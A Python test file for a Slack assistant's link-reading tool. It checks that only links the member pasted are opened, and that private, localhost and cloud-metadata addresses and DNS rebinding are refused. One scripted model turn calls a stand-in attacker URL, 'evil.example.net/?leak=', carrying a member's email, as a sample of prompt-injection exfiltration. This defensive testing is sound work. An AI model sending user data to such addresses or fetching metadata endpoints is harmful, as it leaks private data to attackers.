"""Reading web links the member pasted in Slack.

What matters: the assistant opens only links the member typed, never one the
model wrote or found in club data or Slack, so a page cannot steer it into
sending club data to an attacker's address; private and cloud-metadata
addresses are refused even when pasted; reads are capped per question and per
day; and every read shows up in that member's `/yucg usage`.
"""
import asyncio
import httpx
import os
import socket
import sys
import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
os.environ.setdefault("JWT_SECRET", "slack-links-test-secret-value-12345")
os.environ["FRONTEND_URL"] = "https://outreach.example.org"
os.environ["AI_MONTHLY_BUDGET_USD"] = "20"
os.environ.pop("SLACK_LINK_READING", None)
os.environ.pop("SLACK_LINKS_PER_MEMBER_PER_DAY", None)

from app.database import get_db, init_db  # noqa: E402
from app.services import slack_agent, slack_commands, slack_tools  # noqa: E402
from app.services.slack_tools import SlackContext, extract_links  # noqa: E402

ADMIN = {"id": 1, "email": "admin@yale.edu", "name": "Ada Admin", "role": "admin"}
MEMBER = {"id": 2, "email": "member@yale.edu", "name": "Mo Member", "role": "standard"}
PAGE = {"url": "https://news.example.com/a24", "title": "A24 raises", "excerpt": "A24 closed a round.",
        "observed_at": "2026-11-15", "source_type": "company_website"}


async def seed() -> None:
    db = await get_db()
    try:
        await db.executemany(
            "INSERT INTO users(id,email,name,role,is_active) VALUES (?,?,?,?,1)",
            [(1, ADMIN["email"], ADMIN["name"], "admin"), (2, MEMBER["email"], MEMBER["name"], "standard")],
        )
        await db.commit()
    finally:
        await db.close()


async def reads_logged(user_id: int) -> int:
    db = await get_db()
    try:
        row = await (await db.execute(
            "SELECT COUNT(*) AS n FROM usage_events WHERE event_type=? AND user_id=?",
            (slack_tools.LINK_EVENT, user_id),
        )).fetchone()
    finally:
        await db.close()
    return int(row["n"])


def links_are_read_from_slack_text() -> None:
    text = ("<@U0BOT> summarize <https://news.example.com/a24?x=1&amp;y=2|news.example.com> and "
            "https://blog.example.org/post. Also <https://news.example.com/a24?x=1&amp;y=2> again")
    assert extract_links(text) == ["https://news.example.com/a24?x=1&y=2", "https://blog.example.org/post"]
    assert extract_links("no links, just www.example.com and ftp://x.org") == []
    # "find" and "at" inside a link must not trigger the company shortcut.
    assert slack_agent.is_deterministic_message("find people at https://a24films.com/at") is False
    assert slack_agent.is_deterministic_message("how are we doing at A24?") is True


def tool(name: str, data: dict, tid: str = "t1") -> dict:
    return {"toolUse": {"toolUseId": tid, "name": name, "input": data}}


def converse_script(*turns):
    """A fake model that plays the given assistant turns and records each request."""
    calls: list[dict] = []
    queue = list(turns)

    def converse(messages, **kwargs):
        calls.append({"messages": [dict(m) for m in messages], **kwargs})
        content = queue.pop(0)
        stop = "tool_use" if any("toolUse" in b for b in content) else "end_turn"
        return {"output": {"message": {"role": "assistant", "content": content}}, "stopReason": stop}

    return converse, calls


def results_of(call: dict) -> list[dict]:
    last = call["messages"][-1]
    return [b["toolResult"]["content"][0]["json"] for b in last["content"] if "toolResult" in b]


async def the_tool_is_offered_only_with_a_link() -> None:
    converse, calls = converse_script([{"text": "Nothing queued."}], [{"text": "It says A24 raised."}])
    fetch = AsyncMock(return_value=PAGE)
    with patch.object(slack_agent.llm, "converse", converse), \
            patch("app.services.research_providers.fetch_public_page", fetch):
        await slack_agent._claude_answer("what should I prioritise this week?", MEMBER)
        await slack_agent._claude_answer("summarize https://news.example.com/a24", MEMBER)
    names = [[t["toolSpec"]["name"] for t in c["tools"]] for c in calls]
    assert "read_link" not in names[0], "no link, no web access"
    assert "read_link" in names[1]
    fetch.assert_not_awaited()


async def only_pasted_links_are_opened() -> None:
    before = await reads_logged(MEMBER["id"])
    converse, calls = converse_script(
        [tool("read_link", {"url": "https://evil.example.net/?leak=mo@yale.edu"}, "a"),
         tool("read_link", {"url": "https://news.example.com/a24/"}, "b")],
        [{"text": "A24 closed a round."}],
    )
    fetch = AsyncMock(return_value=PAGE)
    with patch.object(slack_agent.llm, "converse", converse), \
            patch("app.services.research_providers.fetch_public_page", fetch):
        answer = await slack_agent._claude_answer("<@U0BOT> summarize <https://news.example.com/a24>", MEMBER)
    assert answer == "A24 closed a round."
    refused, read = results_of(calls[1])
    assert "Only links the member pasted" in refused["error"]
    assert read["title"] == "A24 raises" and "A24 closed a round." in read["text"]
    assert "Untrusted" in read["note"]
    assert [c.args for c in fetch.await_args_list] == [("https://news.example.com/a24",)]
    assert await reads_logged(MEMBER["id"]) == before + 1, "a refused link is not counted"


async def a_link_from_earlier_in_the_conversation_counts_but_not_slack_text() -> None:
    context = SlackContext(slack_user="UMO", channel="D1", is_dm=True)
    history = [("what do you think of https://blog.example.org/post", "It argues for festivals.")]
    converse, calls = converse_script(
        [tool("read_link", {"url": "https://blog.example.org/post"}, "a"),
         tool("read_link", {"url": "https://from-a-thread.example.com/x"}, "b")],
        [{"text": "Done."}],
    )
    fetch = AsyncMock(return_value=PAGE)
    with patch.object(slack_agent.llm, "converse", converse), \
            patch.object(slack_agent, "load_memory", AsyncMock(return_value=history)), \
            patch.object(slack_agent, "remember_turn", AsyncMock()), \
            patch("app.services.research_providers.fetch_public_page", fetch):
        await slack_agent._claude_answer("read it again and compare", MEMBER, context)
    ok, refused = results_of(calls[1])
    assert "text" in ok and "error" in refused
    assert [c.args for c in fetch.await_args_list] == [("https://blog.example.org/post",)]


async def private_addresses_are_refused_even_when_pasted() -> None:
    for link in ("http://169.254.169.254/latest/meta-data", "http://localhost/admin", "http://10.0.0.5/",
                 "https://user:pw@example.com/", "http://example.com:8080/"):
        context = SlackContext(slack_user="UMO", links=extract_links(link))
        with patch("app.services.research_providers.fetch_public_page", AsyncMock()) as fetch:
            result = await slack_tools.run_tool("read_link", {"url": link}, MEMBER, context)
        assert "not a public web page" in result.get("error", ""), (link, result)
        fetch.assert_not_awaited()

    # A public-looking name that resolves to a private address (DNS rebinding)
    # is stopped by the shared fetcher before any request is sent.
    context = SlackContext(slack_user="UMO", links=["https://rebind.example.com/page"])
    private = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.1.2.3", 443))]
    with patch("socket.getaddrinfo", return_value=private), \
            patch("httpx.AsyncClient.stream", side_effect=AssertionError("no request may be sent")):
        result = await slack_tools.run_tool("read_link", {"url": "https://rebind.example.com/page"}, MEMBER, context)
    assert result == {"error": "That page could not be read"}, result


async def reads_are_capped_per_question_and_per_day() -> None:
    links = [f"https://site{i}.example.com" for i in range(4)]
    context = SlackContext(slack_user="UADA", links=links)
    fetch = AsyncMock(return_value=PAGE)
    with patch("app.services.research_providers.fetch_public_page", fetch):
        results = [await slack_tools.run_tool("read_link", {"url": u}, ADMIN, context) for u in links]
    assert ["text" in r for r in results] == [True, True, False, False]
    assert "per question" in results[2]["error"]
    assert fetch.await_count == slack_tools.LINKS_PER_QUESTION

    os.environ["SLACK_LINKS_PER_MEMBER_PER_DAY"] = "3"
    try:
        fresh = SlackContext(slack_user="UADA", links=links)
        with patch("app.services.research_providers.fetch_public_page", fetch):
            third = await slack_tools.run_tool("read_link", {"url": links[0]}, ADMIN, fresh)
            fourth = await slack_tools.run_tool("read_link", {"url": links[1]}, ADMIN, fresh)
        assert "text" in third
        assert "limit" in fourth["error"], fourth
        assert fetch.await_count == 3
    finally:
        os.environ.pop("SLACK_LINKS_PER_MEMBER_PER_DAY")


async def unreadable_pages_say_so_and_long_pages_are_cut() -> None:
    context = SlackContext(slack_user="UMO", links=["https://example.com/file.pdf", "https://example.com/long"])
    with patch("app.services.research_providers.fetch_public_page", AsyncMock(return_value=None)):
        pdf = await slack_tools.run_tool("read_link", {"url": "https://example.com/file.pdf"}, MEMBER, context)
    assert "no readable text" in pdf["error"]
    huge = dict(PAGE, excerpt="word " * 20_000)
    with patch("app.services.research_providers.fetch_public_page", AsyncMock(return_value=huge)):
        long = await slack_tools.run_tool("read_link", {"url": "https://example.com/long"}, MEMBER, context)
    assert len(long["text"]) <= slack_tools.LINK_TEXT_CHARS


async def a_big_page_is_read_in_part_not_refused() -> None:
    """Most news and Wikipedia pages are over the research fetcher's 300 KB; one over 2 MB is cut."""
    from app.services import research_providers

    big = b"<html><title>Big</title><body><p>" + b"A24 news. " * 250_000 + b"</p></body></html>"
    transport = httpx.MockTransport(lambda request: httpx.Response(
        200, content=big, headers={"content-type": "text/html; charset=utf-8"}))
    real_client = httpx.AsyncClient
    public = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.215.14", 443))]
    with patch("socket.getaddrinfo", return_value=public), \
            patch("httpx.AsyncClient", lambda **kw: real_client(transport=transport, **kw)):
        try:
            await research_providers.fetch_public_page("https://big.example.com/story")
            raise AssertionError("research keeps refusing oversized pages")
        except research_providers.ProviderUnavailable:
            pass
        context = SlackContext(slack_user="UMO", links=["https://big.example.com/story"])
        page = await slack_tools.run_tool("read_link", {"url": "https://big.example.com/story"}, MEMBER, context)
    assert page.get("title") == "Big" and "A24 news." in page.get("text", ""), str(page)[:200]


async def usage_shows_each_members_reads() -> None:
    member = await slack_commands.usage_text(MEMBER)
    mine = await reads_logged(MEMBER["id"])
    assert f"• {mine} web links read ({mine} of 20 in the last day)" in member, member
    assert "across the club" not in member, "club totals are for admins"
    admin = await slack_commands.usage_text(ADMIN)
    total = mine + await reads_logged(ADMIN["id"])
    assert f"• {total} web links read across the club" in admin, admin


async def the_switch_turns_it_off() -> None:
    os.environ["SLACK_LINK_READING"] = "off"
    try:
        converse, calls = converse_script([{"text": "I can't open links."}])
        with patch.object(slack_agent.llm, "converse", converse):
            await slack_agent._claude_answer("summarize https://news.example.com/a24", MEMBER)
        assert "read_link" not in [t["toolSpec"]["name"] for t in calls[0]["tools"]]
        context = SlackContext(slack_user="UMO", links=["https://news.example.com/a24"])
        result = await slack_tools.run_tool("read_link", {"url": "https://news.example.com/a24"}, MEMBER, context)
        assert "turned off" in result["error"]
        assert "Paste a link" not in slack_commands.help_text(MEMBER)
    finally:
        os.environ.pop("SLACK_LINK_READING")
    assert "Paste a link" in slack_commands.help_text(MEMBER)


async def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        os.environ["DATABASE_URL"] = f"sqlite:///{Path(tmp) / 'links.db'}"
        await init_db()
        await seed()
        links_are_read_from_slack_text()
        await the_tool_is_offered_only_with_a_link()
        await only_pasted_links_are_opened()
        await a_link_from_earlier_in_the_conversation_counts_but_not_slack_text()
        await private_addresses_are_refused_even_when_pasted()
        await reads_are_capped_per_question_and_per_day()
        await unreadable_pages_say_so_and_long_pages_are_cut()
        await a_big_page_is_read_in_part_not_refused()
        await usage_shows_each_members_reads()
        await the_switch_turns_it_off()
        print("slack links: ok")


asyncio.run(main())
